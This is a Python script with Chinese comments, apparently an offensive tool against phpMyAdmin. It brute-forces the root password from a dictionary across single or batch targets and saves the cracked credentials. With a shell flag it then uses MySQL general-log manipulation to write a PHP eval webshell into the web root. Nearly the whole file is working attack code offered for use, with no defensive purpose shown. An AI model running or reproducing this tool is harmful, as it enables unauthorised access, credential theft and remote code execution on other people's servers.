import asyncio
import aiohttp
import argparse
import re
import csv
import warnings
warnings.filterwarnings("ignore",category=DeprecationWarning)

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                         'AppleWebKit/537.36 (KHTML, like Gecko) '
                         'Chrome/88.0.4324.190 Safari/537.36',
           'Cookie': 'pma_lang=en'}

username = 'root'
valid_url = []
fail_url = []
url_status = {}
timeout = aiohttp.ClientTimeout(total=3)
jar = aiohttp.CookieJar(unsafe=True)
# 信号量,请自行设置速率!
sem = asyncio.Semaphore(5)


async def check(url):
    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.head(url, headers=headers) as resp:
                if resp.status == 200:
                    print(f'{url} 访问正常!')
                    valid_url.append(url)
                else:
                    print(f'{url} 状态码为{resp.status}')
                    fail_url.append(f'{url},{resp.status}')

    except Exception:
        print(f'{url} 超时')
        fail_url.append(f'{url},超时')


async def getPasswd(url, dic):
    try:
        # 信号量
        async with sem:
            # 如果爆破已完成,就抛出异常,取消剩下的协程任务
            if url_status[url] == 1:
                raise asyncio.CancelledError
            async with aiohttp.ClientSession(cookie_jar=jar, headers=headers) as session:
                async with session.get(url, headers=headers) as getInfo:
                    getText = await getInfo.text()
                    getToken = re.compile('<input type="hidden" name="token" value="(.*?)"', re.S)
                    token = getToken.search(getText).group(1)
                    data = {'pma_username': 'root', 'pma_password': dic,
                            'server': '1', 'target': 'index.php', 'token': token}

                async with session.post(url, data=data, headers=headers) as login:
                    loginText = await login.text()
                    getFail = re.compile('#1045|'
                                         'Cannot log in to the MySQL server|'
                                         'Access denied for user|'
                                         'Login without a password is forbidden|'
                                         'pma_username'
                                         , re.S)
                    if (getFail.search(loginText)):
                        # print(f'当前url:{url},爆破密码中: {dic}')
                        raise asyncio.CancelledError
                    else:
                        url_status[url] = 1
                        print(f'{url}爆破成功,密码为{dic}')
                        saveFile('url_password.txt', f'{url},{dic}')

    except asyncio.CancelledError:
        pass


async def getShell(url, password):
    async with aiohttp.ClientSession(cookie_jar=jar, headers=headers) as session:
        async with session.get(url, headers=headers) as index:
            indexText = await index.text()
            getToken = re.compile('<input type="hidden" name="token" value="(.*?)"', re.S)
            token = getToken.search(indexText).group(1)
            data = {'pma_username': username, 'pma_password': password,
                    'server': '1', 'target': 'index.php', 'token': token}

        async with session.post(url, data=data, headers=headers) as login:
            loginText = await login.text()
            token = getToken.search(loginText).group(1)
            trojan_name = 'mysql.php'
            trojan_password = 'x'

            # 不同站点需修改general_log_file路径
            sql_data = {'sql_query': f'SET GLOBAL general_log_file="D:/phpStudy/PHPTutorial/WWW/{trojan_name}";'
                                     'SET GLOBAL general_log=ON;'
                                     f'SELECT "<?php @eval($_REQUEST[\'{trojan_password}\']);?>";'
                                     'SET GLOBAL general_log=OFF;',
                        'ajax_request': 'true',
                        'token': token}

            sql_url = url + "/import.php"

        async with session.post(sql_url, data=sql_data, headers=headers) as result:
            resultText = await result.json()
            getUrl = re.compile('https?://.*?/')
            url = getUrl.search(url).group()
            if resultText['success'] == True:
                print(f'webshell成功部署!路径:{url + trojan_name},密码:{trojan_password}')
                saveFile('webshell_success.txt', f'webshell:{url + trojan_name},密码:{trojan_password}\n')
            else:
                getError = re.compile('#\d+ - (.*?)</code>')
                error_msg = getError.search(resultText['error']).group(1)
                print(f'{url}: sql语句执行失败,错误原因:{error_msg}')
                saveFile('webshell_fail.txt', f'{url},错误原因:{error_msg}')


def saveFile(filepath, text):
    file = open(filepath, 'a', encoding='utf-8')
    file.write(text + '\n')
    file.close()


def readFile(filepath):
    file = open(filepath, 'r', encoding='utf-8')
    result = file.read()
    file.close()
    return result


async def main():
    tasks = []

    # 本地测试
    # local_ip = input('请输入目标网段(格式:192.168.1.1): ')
    # network = re.search(r'(.*\.)\d+', local_ip).group(1)
    # for i in range(1,255):
    #     ip = f'{network+str(i)}'
    #     tasks.append(asyncio.create_task(check(ip)))
    # await asyncio.wait(tasks)

    # 单目标
    if (args.url):
        if (args.password and args.shell):
            tasks.append(asyncio.create_task(getShell(args.url, args.password)))
            await asyncio.wait(tasks)
        elif (args.dic):
            url_status[args.url] = 0
            for password in readFile(args.dic).splitlines():
                tasks.append(asyncio.create_task(getPasswd(args.url, password)))
            await asyncio.wait(tasks)
        else:
            print('命令输入有误!')

    # 多目标
    elif (args.file):
        if (args.shell):
            file = csv.reader(open(args.file, encoding='utf-8'))
            for url, password in file:
                tasks.append(asyncio.create_task(getShell(url, password)))
            await asyncio.wait(tasks)
        elif (args.dic):
            for url in readFile(args.file).splitlines():
                url_status[url] = 0
                for password in readFile(args.dic).splitlines():
                    tasks.append(asyncio.create_task(getPasswd(url, password)))
                await asyncio.wait(tasks)
        # 根据需要开启检测
        elif (args.check):
            for url in readFile(args.file).splitlines():
                tasks.append(asyncio.create_task(check(url)))
            await asyncio.wait(tasks)

            # 生成valid_url.txt和fail_url.txt
            valid = open('./valid_url.txt', 'a', encoding='utf-8')
            for vu in valid_url:
                valid.write(vu + '\n')
            valid.close()
                
            fail = open('./fail_url.txt', 'a', encoding='utf-8')
            for fu in fail_url:
                fail.write(fu + '\n')
            fail.close()
        else:
            print('命令输入有误!')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="单目标扫描")
    parser.add_argument("-f", "--file", dest="file", help="从文件加载批量目标")
    parser.add_argument("-d", "--dict", dest="dic", help="选择爆破字典")
    parser.add_argument("-p", "--password", dest="password", help="手动输入密码")
    parser.add_argument("--shell", action="store_true", help="开启日志以部署webshell")
    parser.add_argument("--check", action="store_true", help="检测目标链接的有效性")
    args = parser.parse_args()

    if (args.url or args.file):
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main())
    else:
        print('python xxx.py -h')
